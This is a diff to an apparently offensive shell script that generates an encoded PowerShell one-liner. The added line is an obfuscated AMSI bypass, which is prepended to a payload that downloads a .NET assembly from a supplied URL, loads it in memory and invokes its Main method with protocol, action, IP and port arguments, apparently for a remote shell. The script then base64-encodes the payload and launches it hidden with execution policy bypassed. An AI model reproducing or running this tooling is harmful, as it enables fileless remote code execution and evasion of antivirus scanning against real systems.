@@ -678,9 +678,9 @@ proto=$2
 bytes=$(openssl rand -hex $(shuf -i 1-11 -n1))
 assembly=$(openssl rand -hex $(shuf -i 1-11 -n1))
 entryPointMethod=$(openssl rand -hex $(shuf -i 1-11 -n1))
+AMSIb="(([Ref].Assembly.GetTypes()|?{\$_-clike'*Am*s'}).GetFields(2*20)|?{\$_-clike'*d'}).SetValue(\$null,\$true);"
 
-
-rev="\$$bytes = (curl $url -UseBasicParsing ).Content;\$$assembly = [Reflection.Assembly]::Load(\$$bytes);\$$entryPointMethod = @(\$$assembly.GetTypes().GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic') ) -ne \$null;\$$entryPointMethod.Invoke(\$null, (, [string[]] ('$proto', '$action', '$IP', '$PORT')))"
+rev="$AMSIb\$$bytes = (curl $url -UseBasicParsing ).Content;\$$assembly = [Reflection.Assembly]::Load(\$$bytes);\$$entryPointMethod = @(\$$assembly.GetTypes().GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic') ) -ne \$null;\$$entryPointMethod.Invoke(\$null, (, [string[]] ('$proto', '$action', '$IP', '$PORT')))"
 rev=$(echo -n $rev| iconv --to-code UTF-16LE | $benc --base64 -w0)
 rev="powershell -W Hidden -noprofile -executionpolicy bypass -NoExit -e ${rev}"
 
